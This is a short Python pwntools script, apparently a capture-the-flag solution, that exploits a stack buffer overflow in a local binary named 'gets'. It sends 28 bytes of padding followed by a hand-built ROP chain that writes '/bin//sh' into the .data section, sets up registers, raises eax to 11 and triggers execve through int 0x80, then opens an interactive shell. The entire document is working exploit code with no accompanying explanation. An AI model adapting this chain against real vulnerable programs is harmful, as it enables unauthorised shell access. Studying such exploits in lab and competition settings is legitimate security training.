#!/usr/bin/env python

from pwn import *

r = process("./gets")
r.recvuntil("\n")

payload = (
    "A" * 28 +
    p32(0x0806f19a) + # pop edx ; ret
    p32(0x080ea060) + # @ .data
    p32(0x080b84d6) + # pop eax ; ret
    "/bin" +
    p32(0x08054b4b) + # mov dword ptr [edx], eax ; ret
    p32(0x0806f19a) + # pop edx ; ret
    p32(0x080ea064) + # @ .data + 4
    p32(0x080b84d6) + # pop eax ; ret
    "//sh" +
    p32(0x08054b4b) + # mov dword ptr [edx], eax ; ret
    p32(0x0806f19a) + # pop edx ; ret
    p32(0x080ea068) + # @ .data + 8
    p32(0x08049473) + # xor eax, eax ; ret
    p32(0x08054b4b) + # mov dword ptr [edx], eax ; ret
    p32(0x080481c9) + # pop ebx ; ret
    p32(0x080ea060) + # @ .data
    p32(0x080dece1) + # pop ecx ; ret
    p32(0x080ea068) + # @ .data + 8
    p32(0x0806f19a) + # pop edx ; ret
    p32(0x080ea068) + # @ .data + 8
    p32(0x08049473) + # xor eax, eax ; ret
    p32(0x0807ab7f) + # inc eax ; ret
    p32(0x0807ab7f) + # inc eax ; ret
    p32(0x0807ab7f) + # inc eax ; ret
    p32(0x0807ab7f) + # inc eax ; ret
    p32(0x0807ab7f) + # inc eax ; ret
    p32(0x0807ab7f) + # inc eax ; ret
    p32(0x0807ab7f) + # inc eax ; ret
    p32(0x0807ab7f) + # inc eax ; ret
    p32(0x0807ab7f) + # inc eax ; ret
    p32(0x0807ab7f) + # inc eax ; ret
    p32(0x0807ab7f) + # inc eax ; ret
    p32(0x0806cd95) # int 0x80
)

r.sendline(payload)
r.interactive()

r.close()
